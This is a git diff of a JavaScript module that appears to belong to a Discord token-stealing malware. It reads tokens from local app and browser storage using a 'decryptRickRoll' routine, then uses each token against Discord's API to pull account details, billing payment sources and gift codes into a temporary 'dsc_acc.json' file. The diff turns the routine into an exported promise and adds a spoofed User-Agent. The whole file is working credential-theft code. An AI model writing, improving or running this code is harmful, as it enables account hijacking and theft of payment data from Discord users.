@@ -7,6 +7,7 @@ const os = require('os');
 const { addDoubleQuotes } = require('../util/string');
 const axios = require('axios');
 const { tempFolder } = require('../index');
+const { userAgent } = require('../config');
 
 const tokens = [];
 const paths = {
@@ -53,9 +54,7 @@ const decryptRickRoll = (path) => {
       });
       readInterface.on('line', (line) => {
         line.match(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/gi)?.map(token => {
-          if (token.endsWith('\\')) {
-            token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
-          }
+          if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
           if (!encryptedTokens[token]) encryptedTokens.push(token);
         });
       });
@@ -70,49 +69,55 @@ const decryptRickRoll = (path) => {
   });
 };
 
-Object.keys(paths).forEach(path => {
-  if (!existsSync(paths[path])) return;
-  else if (path.includes('Firefox')) {
+module.exports = new Promise((resolve) => {
+  Object.keys(paths).forEach(path => {
+    if (!existsSync(paths[path])) return;
+    else if (path.includes('Firefox')) {
 
-  } else {
-    decryptRickRoll(paths[path]).then(tokens => tokens.map(async token => {
-      token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
-      await axios.get('https://discord.com/api/v10/users/@me', {
-        headers: { Authorization: token }
-      })
-        .then(res => {
-          if (res.status !== 200) return;
-          const json = res.data;
-          let info = {};
-          info.account = json;
-          info.account.token = token;
-          writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
-        })
-        .catch(() => {});
+    } else {
+      decryptRickRoll(paths[path]).then(tokens => {
+        tokens.map(token => {
+          token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
+          axios.get('https://discord.com/api/v10/users/@me', {
+            headers: { Authorization: token, 'User-Agent': userAgent }
+          })
+            .then(res => {
+              if (res.status !== 200) return;
+              let json = res.data;
+              json.token = token;
+              let info = {};
+              if (!info.accounts) info.accounts = []; info.accounts.push(json);
+              writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
 
-      await axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
-        headers: { Authorization: token }
-      })
-        .then(res => {
-          if (res.status !== 200) return;
-          const json = res.data;
-          let info = require(join(tempFolder, 'dsc_acc.json'));
-          info.billing = json;
-          writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
-        })
-        .catch(() => {});
+              axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
+                headers: { Authorization: token, 'User-Agent': userAgent }
+              })
+                .then(res => {
+                  if (res.status !== 200) return;
+                  const json = res.data;
+                  let info = require(join(tempFolder, 'dsc_acc.json'));
+                  if (!info.billing) info.billing = []; json.forEach(b => info.billing.push(b));
+                  writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
 
-      await axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
-        headers: { Authorization: token }
-      })
-        .then(res => {
-          if (res.status !== 200) return;
-          const json = res.data;
-          let info = require(join(tempFolder, 'dsc_acc.json'));
-          info.gifts = json;
-          writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
-        })
-        .catch(() => {});
-    }));
-  }
+                  axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
+                    headers: { Authorization: token, 'User-Agent': userAgent }
+                  })
+                    .then(res => {
+                      if (res.status !== 200) return;
+                      const json = res.data;
+                      let info = require(join(tempFolder, 'dsc_acc.json'));
+                      if (!info.gifts) info.gifts = []; json.forEach(g => info.gifts.push(g));
+                      writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
+
+                      resolve();
+                    })
+                    .catch(() => {});
+                })
+                .catch(() => {});
+            })
+            .catch(() => {});
+        });
+      });
+    }
+  });
 });
